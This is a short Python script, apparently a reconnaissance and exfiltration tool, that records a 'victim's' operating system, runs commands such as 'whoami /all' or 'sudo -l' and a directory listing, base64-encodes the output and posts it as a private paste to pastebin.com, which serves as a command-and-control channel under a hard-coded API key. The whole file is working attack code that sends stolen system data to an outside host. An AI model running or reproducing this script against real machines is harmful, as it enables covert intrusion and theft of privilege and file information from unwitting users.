import base64
import requests
import sys
from platform import system, platform
from subprocess import PIPE, Popen

API_URL = "https://pastebin.com/api/api_post.php"
API_KEY = "tmGFz9jgZjmro9X3TYK2vmHrG4OjB9NT"

message = "Recon results\n"
message = message + f"Victim's OS: {platform()}\n"

if system() == "Windows":
    process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate()
    process = Popen("dir", stdin = PIPE, stdout = PIPE, stderr = PIPE, shell = True)
    result, error = process.communicate()
elif system() == "Linux":
    process = Popen("sudo -l", stdin = PIPE, stdout = PIPE, stderr = PIPE, shell = True) 
    result, error = process.communicate()
    process = Popen("ls", stdin = PIPE, stdout = PIPE, stderr = PIPE, shell = True)
    result, error = process.communicate()
else:
    sys.exit()

print(message)
print(result)

if result == b'':
    sys.exit(0)
else:
    message = message + result.decode()

message = base64.b64encode(message.encode())
print (f"Encoded Result :{message}\n")

data = {
    'api_dev_key': API_KEY,
    'api_option': 'paste',
    'api_paste_private': 1,
    'api_paste_name' : "PasteBin_C&C",
    'api_paste_code': message
}

respond = requests.post(url=API_URL, data=data)
pastebin_url = respond.text

if respond.status_code == 200:
    print(f"Response Code :{respond.status_code}")
    print("SUCCESS")
    print(f"Pastebin URL: {respond.text}")

elif respond.status_code != 200:
    print(f"Response Code :{respond.status_code}")
    print("FAILED")
    print(f"Error: {respond.text}")
